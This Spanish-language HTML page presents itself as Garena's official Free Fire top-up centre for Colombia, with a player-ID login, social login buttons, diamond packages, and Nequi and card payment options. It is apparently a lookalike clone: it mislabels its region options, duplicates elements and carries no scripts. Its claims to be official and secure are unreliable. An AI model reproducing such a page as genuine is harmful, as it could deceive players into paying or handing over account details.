<!DOCTYPE html>
<html lang="es" class="dark">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Centro Oficial de Recargas - Free Fire</title>
    <link rel="stylesheet" href="css/style-d69bda30.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/tailwind.css">

</head>

<body>

    <!-- HEADER -->
    <header class="sticky top-0 z-10">
        <div class="h-14 border-b border-line/50 bg-bg-base md:h-[60px]">
            <div class="mx-auto flex h-full w-full max-w-5xl items-stretch justify-between gap-1 px-3 md:px-4">
                <a class="flex items-center gap-2.5 md:gap-3" href="/">
                    <div class="flex items-center">
                        <img src="images/garena-logo.svg" alt="Garena" class="h-9 w-auto">
                        <div class="ms-1.5 h-5 border-e border-short-line md:ms-3 md:h-3.5"></div>
                    </div>
                    <div class="text-xs font-medium text-text-title max-md:max-w-24 md:text-base/5">
                        Centro Oficial de Recargas
                    </div>
                </a>
                <div class="flex min-w-0 items-stretch gap-4 md:gap-[18px]">
                    <button class="flex min-w-0 items-center gap-1 rounded-md border border-box-border bg-bg-inputbox px-[7px] py-[5px] text-sm/none">
                        <img class="h-4 w-4" src="images/co-flag.png" alt="Colombia">
                        <div>Colombia</div>
                        <div class="h-2.5 border-e border-e-short-line"></div>
                        <span>ES</span>
                    </button>
                </div>
            </div>
        </div>
    </header>
    <!-- BANNER CAROUSEL -->
    <div class="bg-[#151515]">
        <div class="group relative mx-auto w-full max-w-[1366px] md:py-2.5 lg:py-5">
            <div class="relative overflow-hidden">

                <!-- Contenedor de slides -->
                <div id="carouselTrack" class="flex transition-transform duration-700 ease-in-out">

                    <!-- Slide 1 -->
                    <div class="carousel-slide min-w-full flex-shrink-0">
                        <img class="w-full h-auto"
                            src="images/banner-1.jpg"
                            alt="Banner 1">
                    </div>

                    <!-- Slide 2 -->
                    <div class="carousel-slide min-w-full flex-shrink-0">
                        <img class="w-full h-auto"
                            src="images/banner-2.jpg"
                            alt="Banner 2">
                    </div>

                    <!-- Slide 3 -->
                    <div class="carousel-slide min-w-full flex-shrink-0">
                        <img class="w-full h-auto"
                            src="images/banner-3.jpg"
                            alt="Banner 3">
                    </div>

                </div>

                <!-- Botón ANTERIOR -->
                <button id="prevBtn" class="absolute left-4 top-1/2 -translate-y-1/2 z-10 flex h-12 w-12 items-center justify-center rounded-full bg-black/70 text-white transition-all hover:bg-black/90 hover:scale-110">
                    <svg class="h-7 w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2.5">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
                    </svg>
                </button>

                <!-- Botón SIGUIENTE -->
                <button id="nextBtn" class="absolute right-4 top-1/2 -translate-y-1/2 z-10 flex h-12 w-12 items-center justify-center rounded-full bg-black/70 text-white transition-all hover:bg-black/90 hover:scale-110">
                    <svg class="h-7 w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2.5">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
                    </svg>
                </button>

                <!-- Dots -->
                <div class="absolute bottom-4 left-1/2 -translate-x-1/2 z-10 flex gap-2">
                    <button class="carousel-dot h-2.5 w-2.5 rounded-full bg-white/50 transition-all hover:bg-white" data-index="0"></button>
                    <button class="carousel-dot h-2.5 w-2.5 rounded-full bg-white/50 transition-all hover:bg-white" data-index="1"></button>
                    <button class="carousel-dot h-2.5 w-2.5 rounded-full bg-white/50 transition-all hover:bg-white" data-index="2"></button>
                </div>

            </div>
        </div>
    </div>


    <!-- Botón ANTERIOR (izquierda) -->
    <button id="prevBtn" class="absolute left-2 top-1/2 -translate-y-1/2 z-10 flex h-10 w-10 items-center justify-center rounded-full bg-black/60 text-white transition-all hover:bg-black/80 hover:scale-110 md:h-12 md:w-12 md:left-4">
        <svg class="h-6 w-6 md:h-7 md:w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2.5">
            <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
        </svg>
    </button>

    <!-- Botón SIGUIENTE (derecha) -->
    <button id="nextBtn" class="absolute right-2 top-1/2 -translate-y-1/2 z-10 flex h-10 w-10 items-center justify-center rounded-full bg-black/60 text-white transition-all hover:bg-black/80 hover:scale-110 md:h-12 md:w-12 md:right-4">
        <svg class="h-6 w-6 md:h-7 md:w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2.5">
            <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
        </svg>
    </button>

    <!-- Indicadores de posición (dots) -->
    <div class="absolute bottom-3 left-1/2 -translate-x-1/2 z-10 flex gap-2 md:bottom-4">
        <button class="carousel-dot h-2 w-2 rounded-full bg-white/50 transition-all hover:bg-white md:h-2.5 md:w-2.5" data-index="0"></button>
        <button class="carousel-dot h-2 w-2 rounded-full bg-white/50 transition-all hover:bg-white md:h-2.5 md:w-2.5" data-index="1"></button>
        <button class="carousel-dot h-2 w-2 rounded-full bg-white/50 transition-all hover:bg-white md:h-2.5 md:w-2.5" data-index="2"></button>
    </div>

    </div>
    </div>
    </div>


    <!-- Botón ANTERIOR (izquierda) -->
    <button id="prevBtn" class="absolute left-2 top-1/2 -translate-y-1/2 z-10 flex h-12 w-12 items-center justify-center rounded-full bg-black/60 text-white transition-all hover:bg-black/80 hover:scale-110 md:left-4">
        <svg class="h-7 w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2.5">
            <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
        </svg>
    </button>

    <!-- Botón SIGUIENTE (derecha) -->
    <button id="nextBtn" class="absolute right-2 top-1/2 -translate-y-1/2 z-10 flex h-12 w-12 items-center justify-center rounded-full bg-black/60 text-white transition-all hover:bg-black/80 hover:scale-110 md:right-4">
        <svg class="h-7 w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2.5">
            <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
        </svg>
    </button>

    <!-- Indicadores de posición (dots) -->
    <div class="absolute bottom-3 left-1/2 -translate-x-1/2 z-10 flex gap-2 md:bottom-4">
        <button class="carousel-dot h-2.5 w-2.5 rounded-full bg-white/50 transition-all hover:bg-white" data-index="0"></button>
        <button class="carousel-dot h-2.5 w-2.5 rounded-full bg-white/50 transition-all hover:bg-white" data-index="1"></button>
        <button class="carousel-dot h-2.5 w-2.5 rounded-full bg-white/50 transition-all hover:bg-white" data-index="2"></button>
    </div>

    </div>
    </div>
    </div>

    <!-- GAME SELECTION -->
    <div class="bg-[#1e2139] py-8 md:py-12">
        <div class="mx-auto w-full max-w-5xl px-3 md:px-4">
            <h2 class="mb-6 text-xl font-bold text-white md:mb-8 md:text-2xl">Selección de Juego</h2>

            <div class="grid grid-cols-3 gap-4 md:grid-cols-4 md:gap-6 lg:grid-cols-5">

                <!-- Free Fire - Seleccionado -->
                <div class="game-card selected-card group relative flex cursor-pointer flex-col items-center justify-center rounded-xl bg-[#2a2d4a] p-3 outline outline-2 -outline-offset-2 outline-primary-red transition-all hover:scale-105 md:p-4">
                    <div class="relative mb-2 w-full overflow-hidden rounded-lg">
                        <img class="h-full w-full object-cover" src="images/free-fire-icon.png" alt="Free Fire">
                    </div>
                    <div class="text-center text-sm font-medium text-white md:text-base">Free Fire</div>
                    <div class="absolute -right-1 -top-1 flex h-6 w-6 items-center justify-center rounded-full bg-primary-red">
                        <svg class="h-4 w-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
                        </svg>
                    </div>
                </div>

                <!-- Delta Force -->
                <div class="game-card group relative flex cursor-pointer flex-col items-center justify-center rounded-xl bg-[#2a2d4a] p-3 outline outline-1 -outline-offset-1 outline-transparent transition-all hover:scale-105 hover:outline-gray-600 md:p-4">
                    <div class="relative mb-2 w-full overflow-hidden rounded-lg">
                        <img class="h-full w-full object-cover" src="images/delta-force-icon.png" alt="Delta Force">
                    </div>
                    <div class="text-center text-sm font-medium text-gray-400 md:text-base">Delta Force</div>
                </div>

                <!-- Haikyu!! FLY HIGH -->
                <div class="game-card group relative flex cursor-pointer flex-col items-center justify-center rounded-xl bg-[#2a2d4a] p-3 outline outline-1 -outline-offset-1 outline-transparent transition-all hover:scale-105 hover:outline-gray-600 md:p-4">
                    <div class="relative mb-2 w-full overflow-hidden rounded-lg">
                        <img class="h-full w-full object-cover" src="images/haikyu-icon.png" alt="Haikyu FLY HIGH">
                    </div>
                    <div class="text-center text-sm font-medium text-gray-400 md:text-base">Haikyu!! FLY HIGH</div>
                </div>

            </div>
        </div>
    </div>

    <!-- FREE FIRE GAME BANNER -->
    <div class="bg-bg-base py-6 md:py-8">
        <div class="mx-auto w-full max-w-5xl px-3 md:px-4">
            <div class="overflow-hidden rounded-xl">
                <img src="images/free-fire-banner.jpg" alt="Free Fire" class="w-full h-auto">
            </div>
        </div>
    </div>

    <!-- EVENTOS ESPECIALES -->
    <div class="bg-bg-base pb-6 md:pb-8">
        <div class="mx-auto w-full max-w-5xl px-3 md:px-4">
            <h2 class="mb-4 text-xl font-bold text-text-title md:mb-6 md:text-2xl">Eventos Especiales</h2>
            <div class="overflow-hidden rounded-xl">
                <img src="images/evento-ruleta.jpg" alt="Evento" class="w-full h-auto">
            </div>
            <p class="mt-4 text-sm text-text-content md:text-base">
                ¡LA RULETA DE LA SUERTE REGRESÓ! Del 1ero de diciembre al 31 de enero, gira la Ruleta o canjea tus Fortune Ticket para obtener recompensas. No olvides iniciar sesión diariamente para recibir un giro GRATIS!
            </p>
        </div>
    </div>

    <!-- STEP 1: INGRESAR (LOGIN) -->
    <div class="bg-bg-base pb-6 md:pb-8">
        <div class="mx-auto w-full max-w-5xl px-3 md:px-4">
            <h2 class="mb-4 flex items-center gap-3 text-xl font-bold text-text-title md:mb-6 md:text-2xl">
                <span class="flex h-8 w-8 items-center justify-center rounded-md bg-primary-red text-base text-white">1</span>
                <span>Ingresar</span>
            </h2>

            <div class="rounded-xl border border-box-border bg-bg-unselected p-4 md:p-6">
                <label class="mb-3 block text-sm font-medium text-text-content md:text-base">
                    ID de jugador
                    <span class="text-xs text-text-secondary">(Encuéntralo en tu perfil)</span>
                </label>

                <div class="flex items-center gap-3">
                    <div class="relative flex-1">
                        <input type="text"
                            id="playerId"
                            class="block w-full rounded-md border-2 border-box-border bg-bg-inputbox p-3 pr-10 text-base text-text-title outline-none transition-colors focus:border-box-border-focus"
                            placeholder="Introduce el ID del jugador aquí"
                            maxlength="12">
                        <div id="playerIdSpinner" class="absolute right-3 top-1/2 -translate-y-1/2 hidden">
                            <div class="loading-spinner"></div>
                        </div>
                    </div>

                    <select id="playerRegion"
                        class="rounded-md border-2 border-box-border bg-bg-inputbox p-3 text-base text-text-title outline-none transition-colors focus:border-box-border-focus cursor-pointer">
                        <option value="US">USA</option>
                        <option value="BR">IND</option>
                        <option value="CO" selected>BR</option>
                        <option value="MX">ASIA</option>
                        <option value="IN">EUROPE</option>
                    </select>

                    <button id="loginBtn"
                        class="rounded-md bg-primary-red px-6 py-3 text-base font-medium text-white transition-colors hover:bg-red-700">
                        Iniciar Sesión
                    </button>
                </div>

                <!-- Player Verification Success -->
                <div id="playerVerification" class="mt-4 hidden rounded-md border-2 border-green-500 bg-green-500/10 p-3">
                    <div class="flex items-center gap-2">
                        <svg class="h-5 w-5 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                        </svg>
                        <div>
                            <div id="playerName" class="text-lg font-bold text-green-500"></div>
                            <div class="text-xs text-text-secondary mt-0.5">Jugador verificado</div>
                        </div>
                    </div>
                </div>

                <!-- Player Error -->
                <div id="playerError" class="mt-4 hidden rounded-md border-2 border-red-500 bg-red-500/10 p-3">
                    <div class="flex items-center gap-2">
                        <svg class="h-5 w-5 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                        </svg>
                        <div class="text-sm text-red-500" id="playerErrorMsg">ID no encontrado</div>
                    </div>
                </div>

                <!-- Alternative Login -->
                <div class="mt-6 border-t border-box-border pt-6">
                    <p class="mb-4 text-sm text-text-secondary">O ingresa con una cuenta</p>
                    <div class="flex flex-wrap gap-3">
                        <button class="flex items-center gap-2 rounded-md border border-box-border bg-bg-base px-4 py-2 text-sm font-medium text-text-title transition-colors hover:bg-bg-inputbox">
                            <svg class="h-5 w-5" viewBox="0 0 24 24" fill="#1877F2">
                                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                            </svg>
                            Facebook
                        </button>
                        <button class="flex items-center gap-2 rounded-md border border-box-border bg-bg-base px-4 py-2 text-sm font-medium text-text-title transition-colors hover:bg-bg-inputbox">
                            <svg class="h-5 w-5" viewBox="0 0 24 24">
                                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
                                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" />
                                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
                            </svg>
                            Google
                        </button>
                        <button class="flex items-center gap-2 rounded-md border border-box-border bg-bg-base px-4 py-2 text-sm font-medium text-text-title transition-colors hover:bg-bg-inputbox">
                            <svg class="h-5 w-5" viewBox="0 0 24 24" fill="#1DA1F2">
                                <path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z" />
                            </svg>
                            Twitter
                        </button>
                        <button class="flex items-center gap-2 rounded-md border border-box-border bg-bg-base px-4 py-2 text-sm font-medium text-text-title transition-colors hover:bg-bg-inputbox">
                            <svg class="h-5 w-5" viewBox="0 0 24 24" fill="#0088cc">
                                <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z" />
                            </svg>
                            VK
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- STEP 2: MONTO DE RECARGA -->
    <div class="bg-bg-base pb-6 md:pb-8">
        <div class="mx-auto w-full max-w-5xl px-3 md:px-4">
            <h2 class="mb-4 flex items-center gap-3 text-xl font-bold text-text-title md:mb-6 md:text-2xl">
                <span class="flex h-8 w-8 items-center justify-center rounded-md bg-primary-red text-base text-white">2</span>
                <span>Monto de recarga</span>
            </h2>

            <!-- Tabs: Compra / Canjear Código -->
            <div class="mb-6 flex gap-2">
                <button id="buyTab" class="tab-btn active rounded-lg bg-primary-red px-6 py-2 text-base font-medium text-white">
                    Compra
                </button>
                <button id="redeemTab" class="tab-btn rounded-lg border border-box-border bg-bg-unselected px-6 py-2 text-base font-medium text-text-secondary">
                    Canjear Código
                </button>
            </div>

            <!-- Paquetes de Diamantes -->
            <!-- Paquetes de Diamantes -->
            <div id="buyContent" class="grid grid-cols-2 gap-3 md:grid-cols-3 lg:grid-cols-4">

                <!-- 100 Diamantes -->
                <div class="diamond-card group cursor-pointer rounded-xl border-2 border-box-border bg-[#2a2d4a] p-4 transition-all hover:border-primary-red hover:scale-105">
                    <div class="flex items-center justify-center gap-2 mb-3">
                        <img src="images/point.png" alt="Diamond" class="h-5 w-5">
                        <span class="text-xl font-bold text-white">100</span>
                    </div>
                    <div class="text-center text-sm text-text-secondary">COP$ 5.700</div>
                </div>

                <!-- 310 Diamantes -->
                <div class="diamond-card group cursor-pointer rounded-xl border-2 border-box-border bg-[#2a2d4a] p-4 transition-all hover:border-primary-red hover:scale-105">
                    <div class="flex items-center justify-center gap-2 mb-3">
                        <img src="images/point.png" alt="Diamond" class="h-5 w-5">
                        <span class="text-xl font-bold text-white">310</span>
                    </div>
                    <div class="text-center text-sm text-text-secondary">COP$ 12.000</div>
                </div>

                <!-- 520 Diamantes -->
                <div class="diamond-card group cursor-pointer rounded-xl border-2 border-box-border bg-[#2a2d4a] p-4 transition-all hover:border-primary-red hover:scale-105">
                    <div class="flex items-center justify-center gap-2 mb-3">
                        <img src="images/point.png" alt="Diamond" class="h-5 w-5">
                        <span class="text-xl font-bold text-white">520</span>
                    </div>
                    <div class="text-center text-sm text-text-secondary">COP$ 19.600</div>
                </div>

                <!-- 1,050 Diamantes -->
                <div class="diamond-card group cursor-pointer rounded-xl border-2 border-box-border bg-[#2a2d4a] p-4 transition-all hover:border-primary-red hover:scale-105">
                    <div class="flex items-center justify-center gap-2 mb-3">
                        <img src="images/point.png" alt="Diamond" class="h-5 w-5">
                        <span class="text-xl font-bold text-white">1,050</span>
                    </div>
                    <div class="text-center text-sm text-text-secondary">COP$ 38.600</div>
                </div>

                <!-- 1,060 Diamantes -->
                <div class="diamond-card group cursor-pointer rounded-xl border-2 border-box-border bg-[#2a2d4a] p-4 transition-all hover:border-primary-red hover:scale-105">
                    <div class="flex items-center justify-center gap-2 mb-3">
                        <img src="images/point.png" alt="Diamond" class="h-5 w-5">
                        <span class="text-xl font-bold text-white">1,060</span>
                    </div>
                    <div class="text-center text-sm text-text-secondary">COP$ 38.600</div>
                </div>

                <!-- 2,160 Diamantes -->
                <div class="diamond-card group cursor-pointer rounded-xl border-2 border-box-border bg-[#2a2d4a] p-4 transition-all hover:border-primary-red hover:scale-105">
                    <div class="flex items-center justify-center gap-2 mb-3">
                        <img src="images/point.png" alt="Diamond" class="h-5 w-5">
                        <span class="text-xl font-bold text-white">2,160</span>
                    </div>
                    <div class="text-center text-sm text-text-secondary">COP$ 76.800</div>
                </div>

                <!-- 2,180 Diamantes -->
                <div class="diamond-card group cursor-pointer rounded-xl border-2 border-box-border bg-[#2a2d4a] p-4 transition-all hover:border-primary-red hover:scale-105">
                    <div class="flex items-center justify-center gap-2 mb-3">
                        <img src="images/point.png" alt="Diamond" class="h-5 w-5">
                        <span class="text-xl font-bold text-white">2,180</span>
                    </div>
                    <div class="text-center text-sm text-text-secondary">COP$ 77.800</div>
                </div>

                <!-- 5,580 Diamantes -->
                <div class="diamond-card group cursor-pointer rounded-xl border-2 border-box-border bg-[#2a2d4a] p-4 transition-all hover:border-primary-red hover:scale-105">
                    <div class="flex items-center justify-center gap-2 mb-3">
                        <img src="images/point.png" alt="Diamond" class="h-5 w-5">
                        <span class="text-xl font-bold text-white">5,580</span>
                    </div>
                    <div class="text-center text-sm text-text-secondary">COP$ 182.400</div>
                </div>

                <!-- 5,600 Diamantes -->
                <div class="diamond-card group cursor-pointer rounded-xl border-2 border-box-border bg-[#2a2d4a] p-4 transition-all hover:border-primary-red hover:scale-105">
                    <div class="flex items-center justify-center gap-2 mb-3">
                        <img src="images/point.png" alt="Diamond" class="h-5 w-5">
                        <span class="text-xl font-bold text-white">5,600</span>
                    </div>
                    <div class="text-center text-sm text-text-secondary">COP$ 183.400</div>
                </div>

            </div>


            <!-- Ofertas Especiales -->
            <div class="mt-8">
                <h3 class="mb-4 text-lg font-bold text-text-title md:text-xl">Ofertas especiales</h3>

                <!-- GRID UNIFICADO - TODAS LAS 6 TARJETAS JUNTAS -->
                <div class="grid grid-cols-2 gap-3 md:grid-cols-3 lg:grid-cols-4">

                    <!-- Tarjeta Semanal -->
                    <div class="special-card group cursor-pointer overflow-hidden rounded-xl border-2 border-box-border bg-[#2a2d4a] transition-all hover:border-primary-red hover:scale-105"
                        data-special="weekly"
                        data-price="COP$ 8.500"
                        data-name="Tarjeta Semanal">
                        <div class="relative">
                            <img src="images/weekly-pass.png" alt="Tarjeta Semanal" class="h-auto w-full">
                        </div>
                        <div class="p-3 text-center">
                            <p class="text-sm font-medium text-white">Tarjeta Semanal</p>
                            <p class="mt-1 text-xs text-primary-red font-bold">COP$ 8.500</p>
                        </div>
                    </div>

                    <!-- Tarjeta Mensual -->
                    <div class="special-card group cursor-pointer overflow-hidden rounded-xl border-2 border-box-border bg-[#2a2d4a] transition-all hover:border-primary-red hover:scale-105"
                        data-special="monthly"
                        data-price="COP$ 37.900"
                        data-name="Tarjeta Mensual">
                        <div class="relative">
                            <img src="images/monthly-pass.png" alt="Tarjeta Mensual" class="h-auto w-full">
                        </div>
                        <div class="p-3 text-center">
                            <p class="text-sm font-medium text-white">Tarjeta Mensual</p>
                            <p class="mt-1 text-xs text-primary-red font-bold">COP$ 37.900</p>
                        </div>
                    </div>

                    <!-- Rey Sinfonía -->
                    <div class="special-card group cursor-pointer overflow-hidden rounded-xl border-2 border-box-border bg-[#2a2d4a] transition-all hover:border-primary-red hover:scale-105"
                        data-special="rey"
                        data-price="COP$ 19.900"
                        data-name="Rey Sinfonía Explosiva">
                        <div class="relative">
                            <img src="images/rey-sinfonia.jpg" alt="Rey Sinfonía" class="h-auto w-full">
                        </div>
                        <div class="p-3 text-center">
                            <p class="text-sm font-medium text-white">Conjunto Rey Sinfonía Explosiva</p>
                            <p class="mt-1 text-xs text-primary-red font-bold">COP$ 19.900</p>
                        </div>
                    </div>

                    <!-- Reina Melodía -->
                    <div class="special-card group cursor-pointer overflow-hidden rounded-xl border-2 border-box-border bg-[#2a2d4a] transition-all hover:border-primary-red hover:scale-105"
                        data-special="reina"
                        data-price="COP$ 19.900"
                        data-name="Reina Melodía Explosiva">
                        <div class="relative">
                            <img src="images/reina-melodia.jpg" alt="Reina Melodía" class="h-auto w-full">
                        </div>
                        <div class="p-3 text-center">
                            <p class="text-sm font-medium text-white">Conjunto Reina Melodía Explosiva</p>
                            <p class="mt-1 text-xs text-primary-red font-bold">COP$ 19.900</p>
                        </div>
                    </div>

                    <!-- Tarjeta PB -->
                    <div class="special-card group cursor-pointer overflow-hidden rounded-xl border-2 border-box-border bg-[#2a2d4a] transition-all hover:border-primary-red hover:scale-105"
                        data-special="pb"
                        data-price="COP$ 4.500"
                        data-name="Tarjeta PB">
                        <div class="relative">
                            <img src="images/pb-card.png" alt="Tarjeta PB" class="h-auto w-full">
                        </div>
                        <div class="p-3 text-center">
                            <p class="text-sm font-medium text-white">Tarjeta PB</p>
                            <p class="mt-1 text-xs text-primary-red font-bold">COP$ 4.500</p>
                        </div>
                    </div>

                    <!-- Semanal Básica -->
                    <div class="special-card group cursor-pointer overflow-hidden rounded-xl border-2 border-box-border bg-[#2a2d4a] transition-all hover:border-primary-red hover:scale-105"
                        data-special="basic"
                        data-price="COP$ 1.990"
                        data-name="Semanal Básica">
                        <div class="relative">
                            <img src="images/basic-weekly.png" alt="Semanal Básica" class="h-auto w-full">
                        </div>
                        <div class="p-3 text-center">
                            <p class="text-sm font-medium text-white">Semanal Básica</p>
                            <p class="mt-1 text-xs text-primary-red font-bold">COP$ 1.990</p>
                        </div>
                    </div>

                </div>
            </div>



            <!-- STEP 3: MÉTODO DE PAGO -->
            <div class="bg-bg-base pb-6 md:pb-8">
                <div class="mx-auto w-full max-w-5xl px-3 md:px-4">

                    <!-- Título -->
                    <h2 class="mb-4 flex items-center gap-3 text-xl font-bold text-text-title md:mb-6 md:text-2xl">
                        <span class="flex h-8 w-8 items-center justify-center rounded-md bg-primary-red text-base text-white">3</span>
                        <span>Método de pago</span>
                    </h2>

                    <!-- GRID DE MÉTODOS DE PAGO (HORIZONTALES) -->
                    <div class="grid grid-cols-1 gap-3 md:grid-cols-2 md:gap-4">

                        <!-- NEQUI -->
                        <div class="payment-card group relative cursor-pointer overflow-hidden rounded-xl border-2 border-box-border bg-[#2a2d4a] transition-all hover:border-primary-red hover:scale-105"
                            data-method="nequi"
                            onclick="selectPayment(this)">

                            <!-- Contenido horizontal -->
                            <div class="flex items-center gap-4 p-4">

                                <!-- Logo a la izquierda -->
                                <div class="flex h-16 w-16 flex-shrink-0 items-center justify-center rounded-lg bg-white">
                                    <img src="images/nequi.png" alt="Nequi" class="h-12 w-12 object-contain">
                                </div>

                                <!-- Texto a la derecha -->
                                <div class="flex-1">
                                    <p class="text-base font-bold text-white">COP$ <span class="payment-price">76.800</span></p>
                                    <p class="text-sm text-orange-400">+ Bonus 💎 <span class="payment-bonus">218</span></p>
                                </div>
                            </div>

                            <!-- Badges arriba a la derecha -->
                            <div class="absolute right-2 top-2 flex gap-1">
                                <span class="rounded bg-primary-red px-2 py-0.5 text-xs font-bold text-white">PROMO</span>
                                <span class="rounded bg-yellow-500 px-2 py-0.5 text-xs font-bold text-black">POPULAR</span>
                            </div>
                        </div>

                        <!-- TARJETA -->
                        <div class="payment-card group relative cursor-pointer overflow-hidden rounded-xl border-2 border-box-border bg-[#2a2d4a] transition-all hover:border-primary-red hover:scale-105"
                            data-method="card"
                            onclick="selectPayment(this)">

                            <!-- Contenido horizontal -->
                            <div class="flex items-center gap-4 p-4">

                                <!-- Logos a la izquierda -->
                                <div class="flex h-16 w-16 flex-shrink-0 items-center justify-center rounded-lg bg-white">
                                    <img src="images/tarjetas.png" alt="Tarjetas" class="h-12 w-12 object-contain">
                                </div>

                                <!-- Texto a la derecha -->
                                <div class="flex-1">
                                    <p class="text-base font-bold text-white">COP$ <span class="payment-price">76.800</span></p>
                                    <p class="text-sm text-orange-400">+ Bonus 💎 <span class="payment-bonus">218</span></p>
                                </div>
                            </div>

                            <!-- Badge arriba a la derecha -->
                            <div class="absolute right-2 top-2">
                                <span class="rounded bg-primary-red px-2 py-0.5 text-xs font-bold text-white">PROMO</span>
                            </div>
                        </div>

                    </div>

                    <!-- Botón Comprar Ahora -->
                    <div class="mt-8">
                        <button id="buyNowBtn"
                            class="w-full rounded-lg bg-primary-red py-4 text-lg font-bold text-white transition-colors hover:bg-red-700 disabled:cursor-not-allowed disabled:opacity-50"
                            disabled>
                            Comprar Ahora
                        </button>
                    </div>

                    <!-- Info de seguridad -->
                    <div class="mt-6 flex items-start gap-3 rounded-lg bg-bg-unselected p-4">
                        <svg class="h-6 w-6 flex-shrink-0 text-green-500" fill="currentColor" viewBox="0 0 24 24">
                            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
                        </svg>
                        <div>
                            <h4 class="font-bold text-text-title">🔒 Pago 100% seguro</h4>
                            <p class="mt-1 text-sm text-text-secondary">
                                Todas las transacciones están protegidas. Los diamantes se entregan instantáneamente.
                            </p>
                        </div>
                    </div>

                </div>
            </div>




            <!-- FOOTER -->
            <footer class="border-t border-line/50 bg-bg-base py-8 md:py-12">

                <div class="grid grid-cols-1 gap-8 md:grid-cols-3">

                    <!-- Columna 1: Logo y descripción -->
                    <div>
                        <img src="images/garena-logo.svg" alt="Garena" class="mb-4 h-8 w-auto">
                        <p class="text-sm text-text-secondary">
                            Centro Oficial de Recargas de Garena. Compra diamantes y pases de forma segura.
                        </p>
                    </div>

                    <!-- Columna 2: Enlaces -->
                    <div>
                        <h4 class="mb-4 font-bold text-text-title">Enlaces útiles</h4>
                        <ul class="space-y-2 text-sm text-text-secondary">
                            <li><a href="#" class="hover:text-primary-red">Términos de servicio</a></li>
                            <li><a href="#" class="hover:text-primary-red">Política de privacidad</a></li>
                            <li><a href="#" class="hover:text-primary-red">Preguntas frecuentes</a></li>
                            <li><a href="#" class="hover:text-primary-red">Soporte</a></li>
                        </ul>
                    </div>

